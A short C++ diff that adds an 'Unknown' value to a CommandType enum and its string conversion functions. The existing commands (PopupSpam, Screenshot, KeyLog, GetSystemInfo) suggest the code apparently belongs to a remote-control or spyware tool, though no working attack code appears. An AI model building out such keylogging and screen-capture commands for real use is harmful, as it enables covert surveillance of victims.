@@ -10,7 +10,8 @@ enum class CommandType
 	PopupSpam,
 	Screenshot,
 	KeyLog,
-	GetSystemInfo
+	GetSystemInfo,
+	Unknown
 };
 
 inline std::string to_string(const CommandType val)
@@ -21,6 +22,7 @@ inline std::string to_string(const CommandType val)
 	case CommandType::Screenshot: return "Screenshot";
 	case CommandType::KeyLog: return "KeyLog";
 	case CommandType::GetSystemInfo: return "GetSystemInfo";
+	case CommandType::Unknown: return "Unknown";
 	default: throw std::invalid_argument("Unmapped to_string enum in CommandType");
 	}
 }
@@ -32,6 +34,7 @@ inline CommandType ct_from_string(const std::string& val)
 	if ("Screenshot" == val) return CommandType::Screenshot;
 	if ("KeyLog" == val) return CommandType::KeyLog;
 	if ("GetSystemInfo" == val) return CommandType::GetSystemInfo;
+	if ("Unknown" == val) return CommandType::Unknown;
 	throw std::invalid_argument("Invalid argument '" + val + "' when trying to parse CommandType enum");
 }
 
